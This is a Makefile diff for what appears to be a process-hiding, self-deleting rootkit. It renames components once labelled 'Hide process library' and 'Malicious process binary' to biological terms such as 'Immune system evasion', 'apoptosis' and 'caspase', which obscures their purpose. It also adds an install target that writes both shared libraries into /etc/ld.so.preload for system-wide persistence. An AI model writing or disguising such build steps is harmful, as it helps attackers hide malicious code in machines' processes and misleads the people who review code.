@@ -3,21 +3,25 @@ CFLAGS ?= -fPIC -O2 -Wall -Wextra
 LDFLAGS ?= -shared
 LDLIBS ?= -ldl -pthread
 
-# Hide process library
-HIDE_SRC := hide_process.c
-HIDE_TARGET := hide_process.so
+# Installation paths
+LIBDIR := /usr/local/lib
+PRELOAD_FILE := /etc/ld.so.preload
+
+# Immune system evasion
+HIDE_SRC := mhc_downreg.c
+HIDE_TARGET := mhc_downreg.so
 HIDE_OBJ := $(HIDE_SRC:.c=.o)
 
-# Self-delete library
+# Programmed cell death
 SELFDELETE_SRC := apoptosis.c
 SELFDELETE_TARGET := apoptosis.so
 SELFDELETE_OBJ := $(SELFDELETE_SRC:.c=.o)
 
-# Malicious process binary
-BIN_TARGET := malicious_process
-BIN_SRC := malicious_process.c
+# Executioner caspases
+BIN_TARGET := caspase.o
+BIN_SRC := caspase.c
 
-.PHONY: all clean
+.PHONY: all clean install
 
 all: $(HIDE_TARGET) $(SELFDELETE_TARGET) $(BIN_TARGET)
 
@@ -32,6 +36,13 @@ $(SELFDELETE_TARGET): $(SELFDELETE_OBJ)
 
 $(BIN_TARGET): $(BIN_SRC)
 	$(CC) -o $@ $<
+
+install: $(HIDE_TARGET) $(SELFDELETE_TARGET)
+	cp $(HIDE_TARGET) $(LIBDIR)/
+	cp $(SELFDELETE_TARGET) $(LIBDIR)/
+	echo "$(LIBDIR)/apoptosis.so" >> $(PRELOAD_FILE)
+	echo "$(LIBDIR)/mhc_downreg.so" >> $(PRELOAD_FILE)
+	ldconfig
 
 clean:
 	$(RM) $(HIDE_OBJ) $(HIDE_TARGET) $(SELFDELETE_OBJ) $(SELFDELETE_TARGET) $(BIN_TARGET)
